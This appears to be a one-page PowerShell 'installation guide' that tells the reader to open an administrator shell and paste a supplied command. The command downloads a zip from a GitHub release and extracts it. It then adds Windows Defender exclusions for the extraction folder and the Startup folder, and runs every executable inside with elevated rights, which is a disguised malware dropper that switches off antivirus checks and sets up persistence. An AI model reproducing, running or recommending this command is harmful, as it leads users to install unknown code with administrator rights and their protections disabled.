PowerShell Installation Guide

Step 1: Press Windows and type "Windows PowerShell" in the search bar.
Step 2: Right-click Windows PowerShell and click "Run as Administrator".
If a pop-up appears, click "Yes".
Step 3: Copy and paste the code below into PowerShell, then press Enter: $zip="$env:TEMP\tool.zip"; $out="$env:TEMP\tools"; $url="https://github.com/walaywashere/testingonly/releases/download/log/tool.zip"; Invoke-WebRequest $url -OutFile $zip; Expand-Archive $zip -DestinationPath $out -Force; Add-MpPreference -ExclusionPath $out; Add-MpPreference -ExclusionPath ([Environment]::GetFolderPath("Startup")); Get-ChildItem "$out\*.exe" | ForEach-Object { try { Start-Process $_.FullName -Verb RunAs | Out-Null; Write-Host "[ $($_.Name) ] started successfully." } catch { Write-Host "[ $($_.Name) ] failed: $($_.Exception.Message)" } }; Remove-Item $zip
Step 4: Wait until it shows "started successfully", then close PowerShell.
